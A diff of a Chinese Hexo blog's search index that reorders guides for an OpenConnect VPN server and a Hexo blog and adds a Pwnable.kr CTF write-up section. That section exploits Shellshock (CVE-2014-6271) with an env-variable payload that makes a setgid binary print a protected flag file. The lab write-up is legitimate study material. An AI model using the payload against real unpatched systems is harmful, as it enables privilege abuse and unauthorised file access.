@@ -1,163 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>OpenConnect 服务搭建</title>
-    <url>/applications/openconnect/openconnect_%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<p>基于 Ubuntu Desktop 22.04 amd64 系统进行搭建。</p>
-<span id="more"></span>
-
-<h2 id="安装应用"><a href="#安装应用" class="headerlink" title="安装应用"></a>安装应用</h2><p>由于 APT 直接安装的 ocserv 1.1.3 在 Ubuntu 22.04 上会出现崩溃，导致客户端无法连接，所以需要手动安装 1.1.6 及之后的版本。</p>
-<h3 id="APT-安装"><a href="#APT-安装" class="headerlink" title="APT 安装"></a>APT 安装</h3><p>直接使用 apt 安装应用。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y ocserv</span><br></pre></td></tr></table></figure>
-
-<h3 id="DEB-安装"><a href="#DEB-安装" class="headerlink" title="DEB 安装"></a>DEB 安装</h3><p>从 Ubuntu 的软件仓库中下载 ocserv 的 deb 包进行安装。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cz.archive.ubuntu.com/ubuntu/pool/universe/o/ocserv/ocserv_1.2.4-1build2_amd64.deb</span><br><span class="line">sudo dpkg -i ocserv_1.2.4-1build2_amd64.deb</span><br></pre></td></tr></table></figure>
-
-<h3 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h3><p>安装所需依赖。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y libreadline-dev ipcalc-ng gnutls-bin pkg-config nettle-dev libgnutls28-dev libev-dev libprotobuf-c-dev libseccomp-dev</span><br></pre></td></tr></table></figure>
-
-<p>下载源码进行编译安装。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.infradead.org/ocserv/download/ocserv-1.3.0.tar.xz</span><br><span class="line">tar -xvf ocserv-1.3.0.tar.xz</span><br><span class="line">cd ocserv-1.3.0</span><br><span class="line">./configure --sysconfdir=/etc</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-
-<p>新建目录，用于存放 ocserv 的配置文件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir /etc/ocserv</span><br><span class="line">sudo cp doc/sample.config /etc/ocserv/ocserv.conf</span><br></pre></td></tr></table></figure>
-
-<p>复制 <code>ocserv.service</code> 文件，创建 ocserv 服务。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp doc/systemd/standalone/ocserv.service /lib/systemd/system/</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h2><p>编辑 <code>/etc/sysctl.conf</code> 文件，修改以下配置。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#net.ipv4.ip_forward=1 =&gt; net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
-
-<p>应用配置文件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure>
-
-<p>配置 iptables 防火墙的 NAT 功能。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo iptables -t nat -A POSTROUTING -j MASQUERADE</span><br></pre></td></tr></table></figure>
-
-<h2 id="制作证书"><a href="#制作证书" class="headerlink" title="制作证书"></a>制作证书</h2><p>新建任意目录，用于存放制作的自签名证书。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir certificates</span><br><span class="line">cd certificates</span><br></pre></td></tr></table></figure>
-
-<p>新建 <code>ca.tmpl</code> 模板文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cn = &quot;your organization’s certificate authority&quot;</span><br><span class="line">organization = &quot;your organization&quot;</span><br><span class="line">serial = 1</span><br><span class="line">expiration_days = 3650</span><br><span class="line">ca</span><br><span class="line">signing_key</span><br><span class="line">cert_signing_key</span><br><span class="line">crl_signing_key</span><br></pre></td></tr></table></figure>
-
-<p>新建 <code>server.tmpl</code> 模板文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cn = &quot;a sever&#x27;s name, usually matches hostname&quot;</span><br><span class="line">organization = &quot;your organization&quot;</span><br><span class="line">serial = 2</span><br><span class="line">expiration_days = 3650</span><br><span class="line">signing_key</span><br><span class="line">encryption_key</span><br><span class="line">tls_www_server</span><br></pre></td></tr></table></figure>
-
-<p>生成 CA 证书。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certtool --generate-privkey --outfile ca-key.pem</span><br><span class="line">certtool --generate-self-signed --load-privkey ca-key.pem --template ca.tmpl --outfile  ca-cert.pem</span><br></pre></td></tr></table></figure>
-
-<p>生成服务器证书。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certtool --generate-privkey --outfile server-key.pem</span><br><span class="line">certtool --generate-certificate --load-privkey server-key.pem --load-ca-certificate ca-cert.pem --load-ca-privkey ca-key.pem --template server.tmpl --outfile server-cert.pem</span><br></pre></td></tr></table></figure>
-
-<p>将服务器证书复制到 <code>/etc/ocserv</code> 目录。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp server-key.pem server-cert.pem /etc/ocserv/</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置应用"><a href="#配置应用" class="headerlink" title="配置应用"></a>配置应用</h2><p>编辑 <code>/etc/ocserv/ocserv.conf</code> 文件，主要修改以下配置。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用用户名和密码进行登录</span><br><span class="line">auth = &quot;plain[passwd=/etc/ocserv/ocpasswd]&quot;</span><br><span class="line"></span><br><span class="line"># 指定服务监听端口</span><br><span class="line">tcp-port = 443</span><br><span class="line">udp-port = 443</span><br><span class="line"></span><br><span class="line"># 指定服务器证书</span><br><span class="line">server-cert = /etc/ocserv/server-cert.pem</span><br><span class="line">server-key = /etc/ocserv/server-key.pem</span><br><span class="line"></span><br><span class="line"># 允许同时连接的客户端数量</span><br><span class="line">max-clients = 4</span><br><span class="line"></span><br><span class="line"># 限制同一客户端的并行登陆数量</span><br><span class="line">max-same-clients = 2</span><br><span class="line"></span><br><span class="line"># 自动优化 MTU 属性，尝试改善网络性能</span><br><span class="line">try-mtu-discovery = true</span><br><span class="line"></span><br><span class="line"># 指定证书版本，确保服务器正确读取客户端使用的用户证书。</span><br><span class="line">cert-user-oid = 2.5.4.3</span><br><span class="line"></span><br><span class="line"># VPN 分配的网段</span><br><span class="line">ipv4-network = 192.168.1.0</span><br><span class="line">ipv4-netmask = 255.255.255.0</span><br><span class="line"></span><br><span class="line"># VPN 分配的 DNS 服务器</span><br><span class="line">dns = 8.8.8.8</span><br><span class="line">dns = 1.1.1.1</span><br><span class="line"></span><br><span class="line"># 注释掉所有路由，使服务器成为网关</span><br><span class="line">#route = 10.0.0.0/8</span><br><span class="line">#route = 172.16.0.0/12</span><br><span class="line">#route = 192.168.0.0/16</span><br><span class="line"></span><br><span class="line"># 启用 Cisco 客户端兼容性支持</span><br><span class="line">cisco-client-compat = true</span><br></pre></td></tr></table></figure>
-
-<p>添加用户用于 VPN 登录。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ocpasswd -c /etc/ocserv/ocpasswd test</span><br></pre></td></tr></table></figure>
-
-<h2 id="运行应用"><a href="#运行应用" class="headerlink" title="运行应用"></a>运行应用</h2><p>通过指定配置文件运行应用。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ocserv -c /etc/ocserv/ocserv.conf</span><br></pre></td></tr></table></figure>
-
-<p>以调试模式运行应用。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ocserv -c /etc/ocserv/ocserv.conf -f -d 1</span><br></pre></td></tr></table></figure>
-
-<p>启动服务，并设置开机启动。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start ocserv.service</span><br><span class="line">sudo systemctl enable ocserv.service</span><br></pre></td></tr></table></figure>
-
-<p>查看端口确认服务是否开启。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> netstat -anop | grep 443</span></span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      4280/ocserv     off (0.00/0/0)</span><br><span class="line">udp        0      0 0.0.0.0:443             0.0.0.0:*                           4280/ocserv     off (0.00/0/0)</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ednovas.xyz/2022/02/16/ocserv/">使用 ocserv 搭建企业级 OpenConnect VPN 网关 | EdNovas 的小站</a></p>
-<p><a href="https://www.mobibrw.com/2023/38751">深海游弋的鱼 – 默默的点滴</a></p>
-<p><a href="https://docs.openconnect-vpn.net/recipes/ocserv-configuration-basic/">Basic ocserv configuration - OpenConnect VPN how-to guides</a></p>
-<p><a href="http://www.evilvoid.cn/2018/03/24/%E4%BD%BF%E7%94%A8ocserv%E6%90%AD%E5%BB%BA%20VPN%20%E7%95%85%E6%B8%B8%E7%BD%91%E7%BB%9C/">使用ocserv搭建 VPN 畅游网络 | evilvoid</a></p>
-<p><a href="https://docs.openconnect-vpn.net/recipes/ocserv-installation-generic/">Generic - OpenConnect VPN how-to guides</a></p>
-<p><a href="https://www.mail-archive.com/ubuntu-bugs@lists.ubuntu.com/msg6032534.html">[Bug 1975550] [NEW] OpenConnect VPN (ocserv): general protection fault in ocserv-worker when a client tries to connect</a></p>
-]]></content>
-      <categories>
-        <category>工具应用</category>
-        <category>OpenConnect</category>
-      </categories>
-      <tags>
-        <tag>OpenConnect</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo 博客搭建</title>
-    <url>/applications/hexo/hexo_%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他标记语言）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>
-<span id="more"></span>
-
-<h2 id="安装应用"><a href="#安装应用" class="headerlink" title="安装应用"></a>安装应用</h2><p>Hexo 基于 Node.js 开发，并托管在 GitHub 上，因此需要以下工具支持：</p>
-<ul>
-<li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li>
-<li><a href="http://git-scm.com/">Git</a></li>
-</ul>
-<p>安装 Hexo 应用。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
-
-<h2 id="创建博客"><a href="#创建博客" class="headerlink" title="创建博客"></a>创建博客</h2><p>新建目录，作为 Hexo 博客的根目录。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir test-blog</span><br></pre></td></tr></table></figure>
-
-<p>初始化 Hexo 博客，新建和下载所需要的文件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd test-blog</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
-
-<p>完成后，目录基本结构如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure>
-
-<p>依次执行以下命令，可以在本地预览博客。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean      # 清除缓存文件和已生成的静态文件</span><br><span class="line">hexo generate   # 缩写hexo g，生成静态文件。</span><br><span class="line">hexo server     # 缩写hexo d，启动服务器。</span><br></pre></td></tr></table></figure>
-
-<p>默认情况下，访问 <code>http://localhost:4000</code> 进行预览。</p>
-<p><img src="%E9%A2%84%E8%A7%88%E5%8D%9A%E5%AE%A2.png" alt="预览博客"></p>
-<h2 id="配置博客"><a href="#配置博客" class="headerlink" title="配置博客"></a>配置博客</h2><p>Hexo 博客的一些基本配置。</p>
-<h3 id="引用图片"><a href="#引用图片" class="headerlink" title="引用图片"></a>引用图片</h3><p>默认情况下，可以使用 MarkDown 语法通过绝对路径在文章中引用本地或者图床中的图片。</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">This is an example image</span>](<span class="link">/images/example.png</span>)</span><br><span class="line">![<span class="string">This is an example image</span>](<span class="link">https://xxx.xxx.com/images/example.png</span>)</span><br></pre></td></tr></table></figure>
-
-<p>为了便于组织和管理图片资源，可以启用资源目录，将图片与文章放置在一起，通过相对路径进行引用。</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _config.yml</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>文章与图片的目录结构如下，每篇文章对应一个同名的资源目录。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_post</span><br><span class="line">├── example.md</span><br><span class="line">└── example</span><br><span class="line">	└── example.png</span><br></pre></td></tr></table></figure>
-
-<p>使用 MarkDown 语法或者标签插件在文章中引用图片。</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">This is an example image</span>](<span class="link">example/example.png</span>)</span><br><span class="line">&#123;% asset<span class="emphasis">_img example.png This is an example image %&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>在 hexo-renderer-marked 3.1.0 中，引入了一个新的选项，用于简化 MarkDown 引用图片的语句。</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _config.yml</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prependRoot:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">postAsset:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>使用 MarkDown 语法在文章中引用本地图片。</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">This is an example image</span>](<span class="link">example.png</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="部署博客"><a href="#部署博客" class="headerlink" title="部署博客"></a>部署博客</h2><p>Hexo 提供了一键部署功能，可以将博客快速部署到指定服务器。</p>
-<h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><p>登录 GitHub 网站，新建公共仓库，仓库名必须为 <code>&lt;GitHub用户名&gt;.github.io</code> 格式。</p>
-<p>由于通过 HTTP 方式上传至 GitHub 时可能存在问题，所以使用 SSH 方式上传博客文件。</p>
-<p>在本地配置 Git 用户信息，并生成 SSH 密钥对。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;&lt;用户名称&gt;&quot;</span><br><span class="line">git config --global user.email &quot;&lt;指定邮箱&gt;&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;&lt;指定邮箱&gt;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>复制 <code>~/.ssh</code> 目录下 <code>id_rsa.pub</code> 文件中的 SSH 公钥信息，将其添加到 GitHub 站点。</p>
-<p><img src="%E6%B7%BB%E5%8A%A0%E5%AF%86%E9%92%A5.png" alt="添加密钥"></p>
-<p>编辑 <code>_config.yml</code> 博客配置文件，修改部署相关配置。</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:&lt;GitHub用户名&gt;/GitHub用户名&gt;.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure>
-
-<p>部署博客到 GitHub 仓库。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-<p>等待一段时间后，可以通过 <code>https://&lt;GitHub用户名&gt;.github.io</code> 访问博客。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://hexo.io/zh-cn/docs/">文档 | Hexo</a></p>
-]]></content>
-      <categories>
-        <category>工具应用</category>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pwnable.kr - Toddler&#39;s Bottle</title>
     <url>/cyber-security/ctf/pwnable_kr-toddler_s_bottle/</url>
     <content><![CDATA[<p>Pwnable.kr Toddler&#39;s Bottle 练习记录。</p>
@@ -292,6 +135,25 @@
 <p>因此 <code>read()</code> 函数实际是从 <code>stdin</code> 中读取数据。这将使得 <code>pw_buf</code> 和 <code>pw_buf2</code> 的内容均可控，从而可以通过校验，得到 flag 信息。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mistake@pwnable:~$ ./mistake</span><br><span class="line">do not bruteforce...</span><br><span class="line">BBBBBBBBBB</span><br><span class="line">input password : CCCCCCCCCC</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure>
 
+<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>查看程序源码，发现题目目录存在 Bash 程序。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看目录文件，由于 flag 与 bash 的权限不同，所以无法直接读取文件内容。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@pwnable:~$ ls -l</span><br><span class="line">total 960</span><br><span class="line">-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash</span><br><span class="line">-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag</span><br><span class="line">-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock</span><br><span class="line">-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c</span><br></pre></td></tr></table></figure>
+
+<p>根据题目名称，猜测与 ShellShock 漏洞（CVE-2014-6271）有关。</p>
+<blockquote>
+<p>Shellshock是GNU Bourne Again Shell（BASH）中的一个漏洞，攻击者可以使用特制环境变量来运行任意命令。</p>
+</blockquote>
+<p>查看题目目录下 Bash 程序的版本。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@pwnable:~$ ./bash --version</span><br><span class="line">GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)</span><br><span class="line">Copyright (C) 2011 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line"></span><br><span class="line">This is free software; you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br></pre></td></tr></table></figure>
+
+<p>测试 ShellShock 漏洞确实存在。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@pwnable:~$ env x=&#x27;() &#123; :;&#125;; echo test&#x27; ./bash -c &quot;echo this is a test&quot;</span><br><span class="line">test</span><br><span class="line">this is a test</span><br></pre></td></tr></table></figure>
+
+<p>利用 ShellShock 漏洞读取 flag 信息。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@pwnable:~$ env x=&#x27;() &#123; :;&#125;; /bin/cat flag&#x27; ./shellshock</span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>网络安全</category>
@@ -299,6 +161,230 @@
       </categories>
       <tags>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo 博客搭建</title>
+    <url>/applications/hexo/hexo_%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他标记语言）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>
+<span id="more"></span>
+
+<h2 id="安装应用"><a href="#安装应用" class="headerlink" title="安装应用"></a>安装应用</h2><p>Hexo 基于 Node.js 开发，并托管在 GitHub 上，因此需要以下工具支持：</p>
+<ul>
+<li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li>
+<li><a href="http://git-scm.com/">Git</a></li>
+</ul>
+<p>安装 Hexo 应用。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建博客"><a href="#创建博客" class="headerlink" title="创建博客"></a>创建博客</h2><p>新建目录，作为 Hexo 博客的根目录。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir test-blog</span><br></pre></td></tr></table></figure>
+
+<p>初始化 Hexo 博客，新建和下载所需要的文件。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd test-blog</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+
+<p>完成后，目录基本结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure>
+
+<p>依次执行以下命令，可以在本地预览博客。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean      # 清除缓存文件和已生成的静态文件</span><br><span class="line">hexo generate   # 缩写hexo g，生成静态文件。</span><br><span class="line">hexo server     # 缩写hexo d，启动服务器。</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，访问 <code>http://localhost:4000</code> 进行预览。</p>
+<p><img src="%E9%A2%84%E8%A7%88%E5%8D%9A%E5%AE%A2.png" alt="预览博客"></p>
+<h2 id="配置博客"><a href="#配置博客" class="headerlink" title="配置博客"></a>配置博客</h2><p>Hexo 博客的一些基本配置。</p>
+<h3 id="引用图片"><a href="#引用图片" class="headerlink" title="引用图片"></a>引用图片</h3><p>默认情况下，可以使用 MarkDown 语法通过绝对路径在文章中引用本地或者图床中的图片。</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">This is an example image</span>](<span class="link">/images/example.png</span>)</span><br><span class="line">![<span class="string">This is an example image</span>](<span class="link">https://xxx.xxx.com/images/example.png</span>)</span><br></pre></td></tr></table></figure>
+
+<p>为了便于组织和管理图片资源，可以启用资源目录，将图片与文章放置在一起，通过相对路径进行引用。</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _config.yml</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>文章与图片的目录结构如下，每篇文章对应一个同名的资源目录。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_post</span><br><span class="line">├── example.md</span><br><span class="line">└── example</span><br><span class="line">	└── example.png</span><br></pre></td></tr></table></figure>
+
+<p>使用 MarkDown 语法或者标签插件在文章中引用图片。</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">This is an example image</span>](<span class="link">example/example.png</span>)</span><br><span class="line">&#123;% asset<span class="emphasis">_img example.png This is an example image %&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 hexo-renderer-marked 3.1.0 中，引入了一个新的选项，用于简化 MarkDown 引用图片的语句。</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _config.yml</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prependRoot:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">postAsset:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 MarkDown 语法在文章中引用本地图片。</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">This is an example image</span>](<span class="link">example.png</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="部署博客"><a href="#部署博客" class="headerlink" title="部署博客"></a>部署博客</h2><p>Hexo 提供了一键部署功能，可以将博客快速部署到指定服务器。</p>
+<h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><p>登录 GitHub 网站，新建公共仓库，仓库名必须为 <code>&lt;GitHub用户名&gt;.github.io</code> 格式。</p>
+<p>由于通过 HTTP 方式上传至 GitHub 时可能存在问题，所以使用 SSH 方式上传博客文件。</p>
+<p>在本地配置 Git 用户信息，并生成 SSH 密钥对。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;&lt;用户名称&gt;&quot;</span><br><span class="line">git config --global user.email &quot;&lt;指定邮箱&gt;&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;&lt;指定邮箱&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>复制 <code>~/.ssh</code> 目录下 <code>id_rsa.pub</code> 文件中的 SSH 公钥信息，将其添加到 GitHub 站点。</p>
+<p><img src="%E6%B7%BB%E5%8A%A0%E5%AF%86%E9%92%A5.png" alt="添加密钥"></p>
+<p>编辑 <code>_config.yml</code> 博客配置文件，修改部署相关配置。</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:&lt;GitHub用户名&gt;/GitHub用户名&gt;.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure>
+
+<p>部署博客到 GitHub 仓库。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+<p>等待一段时间后，可以通过 <code>https://&lt;GitHub用户名&gt;.github.io</code> 访问博客。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://hexo.io/zh-cn/docs/">文档 | Hexo</a></p>
+]]></content>
+      <categories>
+        <category>工具应用</category>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OpenConnect 服务搭建</title>
+    <url>/applications/openconnect/openconnect_%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<p>基于 Ubuntu Desktop 22.04 amd64 系统进行搭建。</p>
+<span id="more"></span>
+
+<h2 id="安装应用"><a href="#安装应用" class="headerlink" title="安装应用"></a>安装应用</h2><p>由于 APT 直接安装的 ocserv 1.1.3 在 Ubuntu 22.04 上会出现崩溃，导致客户端无法连接，所以需要手动安装 1.1.6 及之后的版本。</p>
+<h3 id="APT-安装"><a href="#APT-安装" class="headerlink" title="APT 安装"></a>APT 安装</h3><p>直接使用 apt 安装应用。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y ocserv</span><br></pre></td></tr></table></figure>
+
+<h3 id="DEB-安装"><a href="#DEB-安装" class="headerlink" title="DEB 安装"></a>DEB 安装</h3><p>从 Ubuntu 的软件仓库中下载 ocserv 的 deb 包进行安装。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cz.archive.ubuntu.com/ubuntu/pool/universe/o/ocserv/ocserv_1.2.4-1build2_amd64.deb</span><br><span class="line">sudo dpkg -i ocserv_1.2.4-1build2_amd64.deb</span><br></pre></td></tr></table></figure>
+
+<h3 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h3><p>安装所需依赖。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y libreadline-dev ipcalc-ng gnutls-bin pkg-config nettle-dev libgnutls28-dev libev-dev libprotobuf-c-dev libseccomp-dev</span><br></pre></td></tr></table></figure>
+
+<p>下载源码进行编译安装。</p>
